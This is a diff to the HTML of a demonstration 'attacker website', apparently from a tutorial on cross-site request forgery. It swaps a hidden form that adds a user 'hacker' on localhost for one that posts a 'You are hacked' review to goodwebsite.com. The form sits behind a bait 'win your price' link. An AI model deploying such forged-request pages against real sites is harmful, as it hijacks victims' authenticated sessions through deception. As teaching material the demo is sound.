@@ -10,12 +10,11 @@
     </style>
   </head>
   <body>
-    <h1>The Attacker Website (Double Submit Cookie)</h1>
+    <h1>The Attacker Website (CSRF)</h1>
     <section>
-        <form method="post" action="http://localhost:3010/add-user">
-          <input name="name" type="hidden" value="hacker"></input>
-          <input name="email" type="hidden" value="pwned@evil-user.ru"></input>
-        </form>
+        <form method="post" action="https://goodwebsite.com:8443/reviews">
+          <input name="newReview" type="hidden" value="You are hacked (😈)"></input>
+      </form>
     </section>
     <a href="#" onclick="document.forms[0].submit()"> 🎉 Click here to win your price 🎉</a>
   </body>
